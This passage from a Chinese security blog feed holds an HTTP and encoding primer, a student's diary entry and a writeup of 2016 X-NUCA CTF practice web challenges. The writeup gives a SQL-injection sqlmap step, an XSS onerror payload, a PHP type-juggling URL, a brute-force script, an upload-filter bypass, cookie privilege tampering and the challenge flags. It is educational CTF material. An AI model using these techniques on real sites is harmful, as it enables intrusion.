<h3 id="独享表空间"><a href="#独享表空间" class="headerlink" title="独享表空间"></a>独享表空间</h3><p>如果将全局变量innodb_file_per_table的值设置为ON，那么之后创建InnoDB存储引擎的新表时，这些表的数据信息、索引信息将保存到独享表空间中。</p>
<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用SQL语句“drop table table_name;&quot;即可删除名为table_name的表</div></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Web安全与攻击技术-基础知识]]></title>
      <url>http://uknowsec.cn/posts/notes/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="0x01-HTTP协议"><a href="#0x01-HTTP协议" class="headerlink" title="0x01 HTTP协议"></a>0x01 HTTP协议</h2><p>超文本传送协议（Hypertext Transport Protocol , HTTP）是分布式、协作式、超媒体系统应用之间的通信协议，是万维网（World Wide Web）交换信息的基础。HTTP是一个客户端终端（用户）和服务端（网站）请求和应答的标准（TCP）。通过使用Web浏览器、网络爬虫或者其他工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80），称这个客户端为用户代理程序。通常，有HTTP客户端发起一个请求，创建一个到服务器指定端口（默认端口为80端口）的TCP连接。HTTO服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，如“HTTP/1.1 200 OK”及返回的内容（请求的文件、错误信息、或者其他信息）。</p>
<h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><p>（1）OPTIONS：该办法可使服务器传回该资源所支持的所有HTTP请求方法。用‘*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。<br>（2）HEAD:与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）<br>（3）GET:向指定资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，如在Web Application中，其中一个原因就是GET可能会被网络蜘蛛等随意访问。<br>（4）POST:向指定资源提交数据，请求服务器进行处理（如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。<br>（5）PUT：向指向资源位置上传其最新内容。<br>（6）DELETE：请求服务器删除Request-URI所标识的资源。<br>（7）TRACE：回显服务器收到的请求，主要用于测试或诊断。<br>（8）CONNECT:HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。<br>以下是一个典型的HTTP GET 请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">User-Agent: Mozilla/4.0(compatible; MSIE 8.0; Windows NT 6.0)</div><div class="line">Host: www.bit.edu.cn</div><div class="line">Accept: text/html</div><div class="line">Accept-Language: zh-CN</div><div class="line">Accept-Rncoding: gzip,deflate</div><div class="line">Cache-Control: no-cache</div><div class="line">Cookie: SessionId= ICONFPDBEPOBLFFGBKKNCGAL</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure></p>
<p>其中，请求的第一行都是由3个以空格间隔的项目组成，分别是请求方法、请求路径、和HTTP版本。其他一些常见的消息头如下。<br>（1）Referer消息头用于表示发出请求的原始URL。<br>（2）User-Agent消息头提供与浏览器或其他请求的客户端软件有关的信息。<br>（3）Host消息头用于指定出现被访问的完整URL中的主机名称。<br>（4）Cookie消息头用于提交服务器向客户端发布的其他参数。</p>
<h3 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h3><p>HTTP状态码（HTTP Status Code）是用以表示网页服务器HTTP响应状态的3位柱子代码。所有HTTP响应的第一行都是状态行，以次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。<br>状态代码的第一数字代表当前响应的类型。<br>（1）1xx消息————请求已被服务器接收，继续处理。<br>（2）2xx成功————请求已成功被服务器接收、理解、并接受。<br>（3）3xx重定向————需要后续操作才能完成这一请求。<br>（4）4xx请求错误————请求含有词法错误或者无法被执行。<br>（5）5xx服务器错误————服务器在处理某个正确请求时发生错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK </div><div class="line">Date: Mon,04 Mar 2013 07:53:16 GMT</div><div class="line">Server: Apache/2.2.23 (Unix) mod_jk/1.2.14</div><div class="line">Content-Length: 31300</div><div class="line">Keep-Alive: timeout=5,max=99</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-Type: text-html</div></pre></td></tr></table></figure></p>
<p>每个HTTP响应的第一行由3个以空格间隔的项目组成，分别为HTTP版本、状态码和原因短语。其他一些常见的消息头如下：<br>（1）Server消息头包含一个旗标，指明所使用的Web服务器软件。有时还包括其他信息，如所安装的模块和服务器操作系统。其中包括的信息可能并不准确。<br>（2）Set-Cookie消息头向浏览器发送另一个Cookie,它将在最后向服务器发送的请求中由Cookie消息头返回。<br>（3）Progma消息头指示浏览器是否将响应保存在缓存中。<br>（4）Expires消息头指出响应内容过期日期。<br>（5）Content-Length消息头规定消息主题的字节长度。<br>（6）Content-Type消息头表示这个消息主题中包含一个HTML文档。</p>
<h3 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h3><p>HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。所以Cookie就是用来绕开HTTO的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含的信息，借此维护用户跟服务器会话中的状态。</p>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>超文本传输安全协议（Hypertext Transfer Protocol Secure, HTTPS）是超文本传输协议和SSL/TLS的组合，用以提供加密通信及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统的敏感信息的传输。<br>HTTPS可为浏览器和服务器间传输的数据提供机密性与完整性保护功能。有助于防止信息泄漏，并且可以保证用户处理的服务器的安全性。但是HTTPS并不能抵御直接针对某个应用程序服务器或客户端组件的攻击，而许多成功的攻击都属于这种类型。因此无论服务器是否使用HTTPS，大多数Web应用程序安全漏洞仍然存在。</p>
<h2 id="0x02-B-S功能及会话"><a href="#0x02-B-S功能及会话" class="headerlink" title="0x02 B/S功能及会话"></a>0x02 B/S功能及会话</h2><h3 id="服务端功能"><a href="#服务端功能" class="headerlink" title="服务端功能"></a>服务端功能</h3><p>Web应用程序主要向用户提供动态生成的内容。当用户请求一个动态资源时，服务器会建立响应并在服务器端执行相应的脚本生成内容，然后将内容返回给用户。在形式上服务器类似于计算机程序，接受输入并处理输入，最后向用户返回输出结果。<br>HTTP请求通常使用以下3种方式向应用程序传递参数。<br>（1）通过URL里的查询字符串。<br>（2）通过在请求主题中使用POST方法。<br>（3）通过HTTP Cookie。</p>
<h3 id="客户端功能"><a href="#客户端功能" class="headerlink" title="客户端功能"></a>客户端功能</h3><p>服务器端应用程序要接收用户输入与操作，并向用户返回其结果，它必须提供一个客户端界面。由于所有的Web应用都通过Web浏览器访问，因此这些界面共享一个技术核心。近些年来客户端技术不断发生变化，以下介绍一些常见的客户端技术。</p>
<h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><p>超文本标记语言（Hyper Text Markup Language, HTML）是为“网页创建和其他可在网页浏览器中看到的信息”设计的一种标记语言。<br>超链接是HTML中常见的一个标签，事实上服务器与客户端之间大量的通信都由用户单击超链接驱动。<br>虽然超链接具有极大的方便性，但许多Web程序还需要采用更灵活的形式收集输入，HTML表单是一种常见的机制，它允许用户提交任意的输入。</p>
<h4 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h4><p>层叠样式表（Cascading Style Sheets）,又称串样式列表，一种用来为结构化文档（如HTML文档或XML应用）添加样式（字体、间距和颜色等）的计算机语言，由W3C定义和维护。CSS目前最新版本为CSS3,是能够真正做到网页表现与内容分离的一种样式是设计语言。相对于传统HTML的表现而言，CSS能够对网页中的对象的位置排版进行像素级的精髓控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力，并能够进行初步交互涉及，是目前基于文本展示最优秀的表现设计语言。CSS能够根据不同使用者的理解能力，简化或者优化写法，针对各类人群，有较强的易读性。</p>
<h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p>JavaScript是一种由Netscape的LiveScript发展而来的原型化继承的面向对象的动态类型的区分大小写的客户端脚本语言，主要目的是为了解决服务器端语言，例如，Perl遗留的速度问题，为客户提供更流畅的浏览效果。<br>JavaScript是一种相对简单但功能强大的编程语言，使用它可以方便地以各种仅使用HTML无法实现的方法对Web界面进行扩展。JavaScript常用于执行以下任务。<br>（1）确定用户输入，然后将其提交给服务器避免数据包含错误而提交不必要的请求。<br>（2）根据用户的输入动态修改用户界面，以减少客户端与服务器端通信次数。<br>（3）查询并更新浏览器内的文档对象模型（Document Object Model, DOM）,控制浏览器行为。</p>
<h4 id="浏览器扩展技术"><a href="#浏览器扩展技术" class="headerlink" title="浏览器扩展技术"></a>浏览器扩展技术</h4><p>除了JavaScript技术外，一些Web应用程序还使用浏览器扩展技术，使用定制代码从各个方面扩展浏览器的内置功能。这些扩展可通过适当的浏览器执行或需要在客户端安装可执行程序。以下列出常见的一些后客户端技术。<br>（1）Java applet<br>（2）ActiveX控件<br>（3）Flash对象<br>（4）Silverlight对象</p>
<h3 id="状态与会话"><a href="#状态与会话" class="headerlink" title="状态与会话"></a>状态与会话</h3><p>HTTP协议本身是无状态的，客户端只需简单地想服务器请求，服务器响应请求返回响应消息。无论是客户端还是服务器都没有记录信息，每一次请求都是独立的。随着Web应用的发展，按需生成动态信息变得越来越重要。其中，Cookie就是为了解决HTTP无状态的而产生的，后来又出现Session，一种在客户端和服务器端保持状态的解决方案。<br>Session基址是一种服务器机制，服务器一般采用类似于散列表的存储结构保存信息。<br>与Cookie机制不同的是，Session采取的是在服务器端保持状态，而Cookie是在客户端保持状态。同时，服务器端需要在客户端保存一个标识。所以Session机制通常需要借助于Cookie来保存Session标识。</p>
<h2 id="编码格式"><a href="#编码格式" class="headerlink" title="编码格式"></a>编码格式</h2><h3 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h3><p>统一资源定位符（Uniform/Universal Resource Locator）也被称为网页地址，如同在网络上的门牌，是因特网上标准的资源的地址（Address）。它最初由蒂姆·伯纳斯·李发明用来作为万维网的地址。现在它已经被万维网联盟编制为因特网标准RFC1738。<br>在因特网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的、可扩展的，它使用ASCII代码的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。<br>统一资源定位符的标准格式如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">协议类型：//服务器地址（必要时要加上端口号）/路径/文件名</div></pre></td></tr></table></figure></p>
<p>URL只允许使用US-ASCII字符集中的可打印字符（ASCII代码在0x20~0x7e范围内）。而且由于其在URL方案或HTTP协议内具有特殊含义，这个范围内的一些字符也不能在URL中使用。URL编码方案对扩展ASCII字符集中的任何有问题的字符进行编码，使其可以通过HTTP安全传输。任何URL编码的字符都是以%为前缀，其后是这个字符的两位十六进制ASCII代码。</p>
<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><p>Unicode是一种为支持全世界所使用的各种编码系统而设计的字符编码标准，它采用各种编码方案，其中一些可用于表示Web应用程序中不常见的字符。<br>16位Unicode编码的工作原理与URL编码类似。为通过HTTP进行传输，16位Unicode编码的字符以%u为前缀，其后是这个字符的十六进制Unicode码点。</p>
<h3 id="HTML-编码"><a href="#HTML-编码" class="headerlink" title="HTML 编码"></a>HTML 编码</h3><p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。许多字符在HTML中具有特殊含义（如HTML元字符），并被用于定义文档结构而非其内容。为了安全使用这些字符，并将其用在文档的内容中，就必须对其进行HTML编码。<br>当攻击Web应用程序时，HTML编码主要在探查跨站脚本漏洞时发挥作用。</p>
<h3 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h3><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个位元为一个单元，对应某个可打印字符。三个字节有24个位元，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。<br>如果最后的输入数据块不能构成3段输出数据，就用一个或两个等号补足输出。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016-08-28]]></title>
      <url>http://uknowsec.cn/posts/life/2016-08-28.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上结识一个今年大四的南京大表哥。跟他聊了很多，有感遂写下这篇博文。</p>
<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p>明天就是大二了，大一一年感觉自己有点混。学习上混，自己想接触的领域也比较混。大一经历了很多，第一次来到南京这个陌生的城市。第一次接触到“信息安全”的名词，第一个想以后从事这个行业的决定。我自己现在也不知道这是个冲动还是我兴趣使然，内心使然。正如TK教主曾经说的：“如果你对于安全这个行业仅仅是为了赚一口饭，那无异于一个性冷淡拍AV。如果你是真正的对于一种技术的追崇，让你会无限的提高，永远对于他有一种新鲜感。”兴趣使然，我依旧坚持自己的选择。我毅不忘初心，亦望始终可得。大一懒懒散散的过去了，从我初了解到这个领域的时候。都是一些小打小闹，在各大论坛也说不得是摸爬滚打。我自己甚至也不知道自己有没有在这过去一年之中学到了技术上的一些东西，结识到一些有益的朋友。这一年自己接触到技术上的问题很浅显，之前一个跟我聊天的学长也提醒过我：“这是一个浮躁的行业，浮躁的人喜欢急功近利，刚刚追求表面”在我听到这句话时，的确给我狠狠的以一巴掌。急功近利地去挖掘漏洞而不了解他的原理，急功近利地去使用他人写的工具而不能自己了解而后改善之，急功近利地卖弄而不能脚踏实地地学习等。大一的暑假也是匆匆忙忙简简单单学习了一下python和PHP的内容，另外也做了一些CTF关于WEB方面的练习，结识了一些打CTF比赛的小伙伴。之前也是踌躇满志地想在暑假提高自己的能力，然后我并没感觉到效果。又是一个新的学期，在这个学期第一天的前夕。还是给自己定下一些目标和计划吧。首先应该是四级吧，先每天做几个题目把它给搞定吧。然后就是上个学期我在图书馆推荐了不少关于安全类的书籍差不多应该可以到馆了吧，尽力去借来看看。还有Python和PHP的内容继续进行学习吧。关于自己专业课方面尽力学好，期末不挂科吧。最后昨天晚上那大四学长跟我说自己拉人组Team的问题，这个可能真的是我之前不敢想的一个事情，但是他给我了不少的鼓励。我也是跃跃欲试的，但是感觉心有余而力不足吧。我个人的能力还是不行的，这种Team在学校搞起来怕也很难发展并不能得到相关方面的支持。还是自己先学习好技术吧，待到时机成熟，也说不定。言至此。</p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>这篇博文算是我大一的一个学期的总结和大二新的计划和目标的先行书吧，望以此勉之。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ 2016年X-NUCA全国高校网安联赛--赛前指导练习题web进阶篇Writeup ]]></title>
      <url>http://uknowsec.cn/posts/ctf/2016%E5%B9%B4X-NUCA%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一次写Writeup，尝试一下吧！</p>
<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>捉迷藏<br>描述：从页面中找到隐藏的flag<br><a href="http://218.76.35.75:20111" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%871.png" alt=""><br>F12审查元素发现有一个Index.php的链接，把背景去掉。点击链接得到flag</p>
<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>flag{th!5!5n0tth3fl@g}</p>
<h3 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>简单问答<br>描述：这几个小问题实在是太简单了，相信你一定能获得满分<br><a href="http://218.76.35.75:20112" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>审查元素将按钮键的disabled改为abled。<br>利用burpsuite抓取数据包，修改参数提交得到flag<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%872.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%873.png" alt=""></p>
<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p>flag{W3ll_d0n3}</p>
<h3 id="后台后台后台"><a href="#后台后台后台" class="headerlink" title="后台后台后台"></a>后台后台后台</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>后台后台后台<br>描述：登录这个网站很容易，请进入后台寻找flag<br><a href="http://218.76.35.75:20113" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用burpsuite抓取数据包，把cookie中的Member参数修改为Admin的base64的编码，得到flag.<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%875.png" alt=""></p>
<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p>flag{C00ki3_n0m_n0m_n0m}</p>
<h3 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>php是最好的语言<br>描述：据说php是最好的语言，perfect？来试试看<br><a href="http://218.76.35.75:20114" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017f&quot;,&quot;bar2&quot;:[[1,1],1,1,1,1]&#125;&amp;cat[0]=123&amp;cat[1][]=1&amp;dog=%00htctf2016</div></pre></td></tr></table></figure></p>
<h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p>flag{php_i5_n0t_b4d}</p>
<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><h4 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h4><p>忘记密码了<br>描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么<br><a href="http://218.76.35.75:20115/" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>把bob和sam的MD5解出来分别是bob317和sam429,利用脚本爆破密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import hashlib</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line"></div><div class="line">url=&quot;http://218.76.35.75:20115/index.php&quot;</div><div class="line">for i in xrange(1000):</div><div class="line"></div><div class="line">    header=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;&#125;</div><div class="line"></div><div class="line">    param=hashlib.md5(&quot;slash&quot;+str(i)).hexdigest()</div><div class="line"></div><div class="line">    tmpurl=url+&quot;?page=&quot;+param</div><div class="line"></div><div class="line">    print tmpurl</div><div class="line"></div><div class="line">    result=r.get(tmpurl,headers=header)</div><div class="line"></div><div class="line">    content=result.content</div><div class="line"></div><div class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</div><div class="line"></div><div class="line">        print content</div><div class="line"></div><div class="line">        print i</div><div class="line"></div><div class="line">        break</div></pre></td></tr></table></figure></p>
<p>得到结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%876.png" alt=""></p>
<h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p>flag{n1ce_te4m_n1ce_Rock}</p>
<h3 id="php是最好的语言-1"><a href="#php是最好的语言-1" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h3><h4 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h4><p>http 头注入<br>描述：换个浏览器试试？</p>
<p><a href="http://218.76.35.75:20121" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>抓包得到数据包，Referer处加*号。sqlmap -r xx.txt。得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /heetian.php HTTP/1.1</div><div class="line">Host: 218.76.35.75:20121</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://www.google.com/search?hl=en&amp;q=*</div><div class="line">Cookie: PHPSESSID=gr7gtgjm8v0q5a9j3ampntgmp0; User=JohnTan101; Member=Tm9ybWFs</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
<h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p>flag{Y0ugetT82f00000laev}</p>
<h3 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h3><h4 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h4><p>简单的文件上传<br>描述：上传php 文件就给你flag<br><a href="http://218.76.35.75:20122/" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>上传一个php文件，抓包将Content-Type改为 image/jpeg上传，得到flag.<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%877.png" alt=""></p>
<h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p>flag{Upl00d30668ss9h97aFil3}</p>
<h3 id="简单的JS"><a href="#简单的JS" class="headerlink" title="简单的JS"></a>简单的JS</h3><h4 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h4><p>简单的JS<br>描述：执行后的结果就是flag 的url<br><a href="http://218.76.35.75:20123/" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开解题链接</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%878.png" alt=""></p>
<p>还有一个明显提示 evilurl is flag </p>
<p>看不出什么其他的，直接查看源码</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%879.png" alt=""></p>
<p>在这里可以看到定义一个p，eval以后写到页面，但是好像并没有输出什么，猜测可能这里没有执行成功，JS 问题可以直接查看控制台</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8710.png" alt=""></p>
<p>可以看到报语法错误，</p>
<p>我们把这个语句copy下来，自己调试好</p>
<p>没修改之前，明显的有报错</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8711.png" alt=""></p>
<p>我们把它第二行的空格和第一行的换行符删掉，然后执行eval，看下P 到底是什么</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8712.png" alt=""></p>
<p>题目提示执行后的结果就是flag的url</p>
<p>访问这个url试试</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8713.png" alt=""></p>
<p>页面没有输出什么，再抓包看看</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8714.png" alt=""></p>
<p>可以看到flag已经写在cookie里了。</p>
<h4 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h4><p>flag{COOk1els60SecU5e}</p>
<h3 id="试试xss"><a href="#试试xss" class="headerlink" title="试试xss"></a>试试xss</h3><h4 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h4><p>描述：alert document.domain</p>
<p><a href="http://218.76.35.75:20125/" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开就一个输入框，输入字母啥的没啥反应。。。。</p>
<p>被谁吃了。。。</p>
<p>既然提示xss，就试试特殊符号吧，比如“&lt;&gt;”</p>
<p>加个’的时候，多了一个img标签，什么鬼。。。。。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8715.png" alt=""></p>
<p>当我输入’aaaaaaaaaaaa的时候。。。。</p>
<p>aaaaaaaaaaaa居然直接成了img的一个属性名，可怕。。。。</p>
<p>这样就简单了，瞬间就想到onerror，既然hint 是alertdocument.domain，那就用这个吧</p>
<p>直接’ onerror=alert(document.domain)这样不就可以了，试试先。。。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8716.png" alt=""></p>
<p>居然没弹出来。。。。</p>
<p>为什么！！！！！</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""></p>
<p>查看下源码。。。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8718.png" alt=""></p>
<p>至少知道了我们输入的内容并没有被实体编码。。。</p>
<p>但是onerror事件没有发生，就说明img标签的src并没有出错。。。</p>
<p>再看看刚才我们输入的内容</p>
<p>onerror=alert(document.domain)</p>
<p>如果在’前面加一个不存在的路径，那后面的onerror事件不就可以出发了么。。。</p>
<p>试试再说。。。。</p>
<p>输入heetian.jpg’ onerror=alert(document.domain)</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8719.png" alt=""></p>
<p>终于出来了。。。</p>
<h4 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h4><p>flag{D0Gum6Ntd0M11n}</p>
<h3 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h3><h4 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h4><p>简单的文件包含<br>描述：Flag 在/flag<br><a href="http://218.76.35.75:20126/" target="_blank" rel="external">题目链接</a></p>
